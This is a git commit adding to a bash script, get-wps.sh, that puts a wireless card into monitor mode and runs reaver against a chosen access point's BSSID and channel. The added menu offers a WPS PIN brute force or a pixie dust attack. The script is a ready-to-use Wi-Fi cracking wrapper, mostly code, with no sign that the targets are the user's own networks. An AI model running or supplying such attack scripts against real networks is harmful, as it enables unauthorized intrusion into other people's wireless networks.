909bd24c32fb696c048980dc4121095e89aab52d
Krzysztof Kuczewski <k.kuczewski10@gmail.com>
2025-08-03 18:25:25 +0200

    Finished the get-wps script

--- get-wps.sh
+++ get-wps.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?pref=2&pli=1&gid=2048815923#gid=2048815923
+
 mode=$(iwconfig "${INTERFACE}" | grep -o "Mode:Managed")
 
 if [ "${mode}" = "Mode:Managed" ]; then
@@ -7,8 +9,6 @@ if [ "${mode}" = "Mode:Managed" ]; then
         sudo iwconfig ${INTERFACE} mode monitor
         sudo ifconfig ${INTERFACE} up
 fi
-
-sleep 3
 
 read -p "use 5ghz? (y/n): " ghz
 echo -e "Press ctrl+c to stop the scan\n"
@@ -21,9 +21,15 @@ fi
 
 read -p "bssid?: " bssid
 read -p "channel?: " channel
+echo -e "\nChoose an attack:\n1 - normal wps brute force\n2 - pixie dust attack\n"
+read -p "attack? (1/2): " attack
 
-if [ "$ghz" = "n" ]; then
-    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
-elif [ "$ghz" = "y" ]; then
-    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
+if [ "$attack" = "1" ]; then
+	if [ "$ghz" = "n" ]; then
+    		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
+	elif [ "$ghz" = "y" ]; then
+		sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
+	fi
+elif [ "$attack" = "2" ]; then
+	sudo reaver -i "$INTERFACE" -K -b "$bssid" -c "$channel" -vv # the only difference is -K
 fi
